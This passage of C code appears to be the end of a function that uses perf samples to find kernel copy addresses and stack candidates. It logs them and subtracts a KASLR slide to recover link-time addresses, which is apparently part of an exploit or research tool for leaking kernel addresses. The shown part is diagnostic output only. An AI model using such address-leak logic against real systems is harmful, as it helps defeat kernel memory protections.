          sample_count, matched_count, (unsigned long long)copy_address,
          best_count);
  pr_info("perf mcast source hits=%d\n", source_hits);
  for (int i = 0; i < candidate_count; i++) {
    pr_info("perf mcast copy[%d]=%016llx n=%u\n", i,
            (unsigned long long)candidates[i], counts[i]);
  }
  for (int shown = 0; shown < 16; shown++) {
    int best = -1;
    for (int i = 0; i < stack_candidate_count; i++) {
      if (stack_counts[i] &&
          (best < 0 || stack_counts[i] > stack_counts[best])) {
        best = i;
      }
    }
    if (best < 0) {
      break;
    }
    pr_info("perf mcast sp[%d]=%016llx n=%u\n", shown,
            (unsigned long long)stack_candidates[best], stack_counts[best]);
    stack_counts[best] = 0;
  }
  if (!copy_address) {
    for (int i = 0; i < debug_ip_count; i++) {
      pr_info("perf mcast frame ip[%d]=%016llx n=%u link=%016llx\n", i,
              (unsigned long long)debug_ips[i], debug_counts[i],
              (unsigned long long)(debug_ips[i] - kaslr_slide));
    }
  }
  return copy_address;
}
